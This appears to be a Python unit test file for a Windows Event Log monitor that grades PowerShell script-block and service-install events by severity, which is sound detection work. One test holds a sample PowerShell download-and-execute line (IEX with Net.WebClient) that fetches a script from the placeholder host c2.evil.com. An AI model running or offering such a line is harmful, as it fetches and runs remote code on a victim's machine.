"""Unit tests for Phase 3 Windows Event Log telemetry ingestion."""

from app.database.models import RiskLevel
from app.monitoring.event_log_monitor import EventLogMonitor


def test_parse_powershell_script_block_event() -> None:
    monitor = EventLogMonitor()

    malicious_script = "IEX ((New-Object Net.WebClient).DownloadString('http://c2.evil.com/run.ps1'))"
    ev = monitor.parse_event(
        event_id=4104,
        channel="Microsoft-Windows-PowerShell/Operational",
        provider="Microsoft-Windows-PowerShell",
        message=malicious_script,
        event_time="2026-10-07T08:00:00Z",
    )

    assert ev.event_id == 4104
    assert ev.severity == RiskLevel.HIGH.value
    assert "Suspicious Script Block" in ev.message
    assert "Dynamic code execution" in ev.message or "remote download" in ev.message


def test_parse_benign_script_block_event() -> None:
    monitor = EventLogMonitor()

    benign_script = "Get-ChildItem -Path C:\\Users\\Public -Filter *.log"
    ev = monitor.parse_event(
        event_id=4104,
        channel="Microsoft-Windows-PowerShell/Operational",
        provider="Microsoft-Windows-PowerShell",
        message=benign_script,
        event_time="2026-10-07T08:05:00Z",
    )

    assert ev.event_id == 4104
    assert ev.severity == RiskLevel.LOW.value


def test_parse_service_installed_event() -> None:
    monitor = EventLogMonitor()

    ev = monitor.parse_event(
        event_id=7045,
        channel="System",
        provider="Service Control Manager",
        message="A service was installed in the system: Service Name: BackdoorSvc",
        event_time="2026-10-07T08:10:00Z",
    )

    assert ev.event_id == 7045
    assert ev.severity == RiskLevel.HIGH.value
    assert "Persistence Alert" in ev.message
